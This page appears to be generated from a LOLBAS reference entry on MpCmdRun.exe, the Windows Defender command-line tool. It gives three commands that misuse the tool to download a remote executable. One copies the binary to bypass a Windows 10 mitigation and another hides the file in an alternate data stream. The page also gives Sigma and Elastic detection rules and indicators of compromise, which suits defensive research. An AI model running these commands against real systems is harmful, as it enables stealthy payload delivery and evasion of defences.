---
parsed_by: focuslocust
source: lolbas
type: generated
---
# MpCmdRun.exe

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Type | `tool` |
| Record ID | `mpcmdrun.exe` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OSBinaries/MpCmdRun.yml` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [MpCmdRun.exe](../../tools/windows/mpcmdrun.exe.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | mpcmdrun.exe |
| name | MpCmdRun.exe |
| type | tool |
| source | lolbas |
| url | https://docs.microsoft.com/en-us/windows/security/threat-protection/microsoft-defender-antivirus/command-line-arguments-microsoft-defender-antivirus |

## Preserved Source Material

```yaml
Acknowledgement:
- Handle: '@mohammadaskar2'
  Person: Askar
- Handle: '@oddvarmoe'
  Person: Oddvar Moe
- Person: RichRumble
- Handle: '@th3c3dr1c'
  Person: Cedric
Author: Oddvar Moe
Commands:
- Category: Download
  Command: MpCmdRun.exe -DownloadFile -url {REMOTEURL:.exe} -path {PATH_ABSOLUTE:.exe}
  Description: Download file to specified path - Slashes work as well as dashes (/DownloadFile, /url, /path)
  MitreID: T1105
  OperatingSystem: Windows 10
  Privileges: User
  Usecase: Download file
- Category: Download
  Command: copy "C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2008.9-0\MpCmdRun.exe" C:\Users\Public\Downloads\MP.exe
    && chdir "C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2008.9-0\" && "C:\Users\Public\Downloads\MP.exe" -DownloadFile
    -url {REMOTEURL:.exe} -path C:\Users\Public\Downloads\evil.exe
  Description: Download file to specified path. Slashes work as well as dashes (/DownloadFile, /url, /path). Updated version
    to bypass Windows 10 mitigation.
  MitreID: T1105
  OperatingSystem: Windows 10
  Privileges: User
  Usecase: Download file
- Category: ADS
  Command: MpCmdRun.exe -DownloadFile -url {REMOTEURL:.exe} -path {PATH_ABSOLUTE:.exe}:evil.exe
  Description: Download file to machine and store it in Alternate Data Stream
  MitreID: T1564.004
  OperatingSystem: Windows 10
  Privileges: User
  Usecase: Hide downloaded data into an Alternate Data Stream
Created: 2020-03-20
Description: Binary part of Windows Defender. Used to manage settings in Windows Defender
Detection:
- Sigma: https://github.com/SigmaHQ/sigma/blob/159bf4bbc103cc2be3fef4b7c2e7c8b23b63fd10/rules/windows/process_creation/win_susp_mpcmdrun_download.yml
- Elastic: https://github.com/elastic/detection-rules/blob/6ef5c53b0c15e344f0f2d1649941391aea6fa253/rules/windows/command_and_control_remote_file_copy_mpcmdrun.toml
- IOC: MpCmdRun storing data into alternate data streams.
- IOC: MpCmdRun retrieving a file from a remote machine or the internet that is not expected.
- IOC: Monitor process creation for non-SYSTEM and non-LOCAL SERVICE accounts launching mpcmdrun.exe.
- IOC: Monitor for the creation of %USERPROFILE%\AppData\Local\Temp\MpCmdRun.log
- IOC: User Agent is "MpCommunication"
Full_Path:
- Path: C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2008.4-0\MpCmdRun.exe
- Path: C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2008.7-0\MpCmdRun.exe
- Path: C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2008.9-0\MpCmdRun.exe
- Path: C:\Program Files\Windows Defender\MpCmdRun.exe
- Path: C:\Program Files (x86)\Windows Defender\MpCmdRun.exe
- Path: C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.23110.3-0\X86\MpCmdRun.exe
Name: MpCmdRun.exe
Resources:
- Link: https://docs.microsoft.com/en-us/windows/security/threat-protection/microsoft-defender-antivirus/command-line-arguments-microsoft-defender-antivirus
- Link: https://twitter.com/mohammadaskar2/status/1301263551638761477
- Link: https://twitter.com/Oddvarmoe/status/1301444858910052352
- Link: https://twitter.com/NotMedic/status/1301506813242867720
_source_path: /home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OSBinaries/MpCmdRun.yml
```

## Detection / Analysis Notes

```text
Elastic: https://github.com/elastic/detection-rules/blob/6ef5c53b0c15e344f0f2d1649941391aea6fa253/rules/windows/command_and_control_remote_file_copy_mpcmdrun.toml
```

```text
IOC: Monitor for the creation of %USERPROFILE%\AppData\Local\Temp\MpCmdRun.log
```

```text
IOC: Monitor process creation for non-SYSTEM and non-LOCAL SERVICE accounts launching mpcmdrun.exe.
```

```text
IOC: MpCmdRun retrieving a file from a remote machine or the internet that is not expected.
```

```text
IOC: MpCmdRun storing data into alternate data streams.
```

```text
IOC: User Agent is "MpCommunication"
```

```text
Sigma: https://github.com/SigmaHQ/sigma/blob/159bf4bbc103cc2be3fef4b7c2e7c8b23b63fd10/rules/windows/process_creation/win_susp_mpcmdrun_download.yml
```

```text
- Sigma: https://github.com/SigmaHQ/sigma/blob/159bf4bbc103cc2be3fef4b7c2e7c8b23b63fd10/rules/windows/process_creation/win_susp_mpcmdrun_download.yml
- Elastic: https://github.com/elastic/detection-rules/blob/6ef5c53b0c15e344f0f2d1649941391aea6fa253/rules/windows/command_and_control_remote_file_copy_mpcmdrun.toml
- IOC: MpCmdRun storing data into alternate data streams.
- IOC: MpCmdRun retrieving a file from a remote machine or the internet that is not expected.
- IOC: Monitor process creation for non-SYSTEM and non-LOCAL SERVICE accounts launching mpcmdrun.exe.
- IOC: Monitor for the creation of %USERPROFILE%\AppData\Local\Temp\MpCmdRun.log
- IOC: User Agent is "MpCommunication"
```
